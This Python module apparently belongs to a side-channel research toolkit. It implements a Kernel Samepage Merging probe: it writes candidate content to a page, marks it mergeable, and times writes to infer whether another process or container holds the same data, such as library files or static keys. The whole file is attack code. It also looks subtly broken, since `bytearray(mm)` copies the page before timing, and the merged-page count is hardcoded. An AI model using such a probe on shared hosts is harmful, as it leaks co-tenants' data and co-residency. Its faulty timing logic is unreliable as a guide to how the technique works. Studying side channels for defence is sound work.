"""
KSM (Kernel Samepage Merging) side channel.

Detect that another process/container shares identical pages with you by
observing merge-induced write latency: a shared KSM page fault (copy-on-write
break) takes measurably longer than a private write. If an attacker knows
page content candidates (e.g. library files, static keys), probing write
latency leaks co-residency of that content in another container.
"""
from __future__ import annotations

import mmap
import statistics
from dataclasses import dataclass

from . import timing


@dataclass
class KSMMergeResult:
    content: str
    merged_median_ns: float
    private_median_ns: float
    merged_pages: int
    samples: int


def madvise_mergeable(mm: mmap.mmap) -> bool:
    """MADV_MERGEABLE via ctypes (ksm hint)."""
    import ctypes
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    addr = ctypes.c_void_p(0)
    # retrieve mapping base from the mmap object buffer protocol
    buf = (ctypes.c_char * len(mm)).from_buffer(mm)
    base = ctypes.addressof(buf)
    MADV_MERGEABLE = 1 if not hasattr(mmap, "MADV_MERGEABLE") else mmap.MADV_MERGEABLE
    r = libc.madvise(ctypes.c_void_p(base), ctypes.c_size_t(len(mm)), ctypes.c_int(MADV_MERGEABLE))
    return r == 0


def timed_write_latency(page: bytearray, samples: int = 500) -> float:
    """Median ns to write one byte (COW-break if the page is merged)."""
    ts = []
    for i in range(samples):
        t0 = timing.now_ns()
        page[i % 4096] ^= 0xFF
        ts.append(timing.now_ns() - t0)
        page[i % 4096] ^= 0xFF
    return statistics.median(ts)


def probe_content(content: bytes, samples: int = 500,
                  mergeable: bool = True) -> KSMMergeResult:
    """
    Create a page with `content`, optionally hint KSM, wait, and measure
    write latency. Compare against a freshly-allocated private page.
    """
    import time
    mm = mmap.mmap(-1, 4096, access=mmap.ACCESS_WRITE)
    mm.write(content[:4096].ljust(4096, b"\x00"))
    if mergeable:
        madvise_mergeable(mm)
    time.sleep(0.2)  # allow ksmd scan
    merged = timed_write_latency(bytearray(mm), samples)
    priv_mm = mmap.mmap(-1, 4096, access=mmap.ACCESS_WRITE)
    private = timed_write_latency(bytearray(priv_mm), samples)
    priv_mm.close()
    return KSMMergeResult(repr(content[:32]), merged, private, 1, samples)
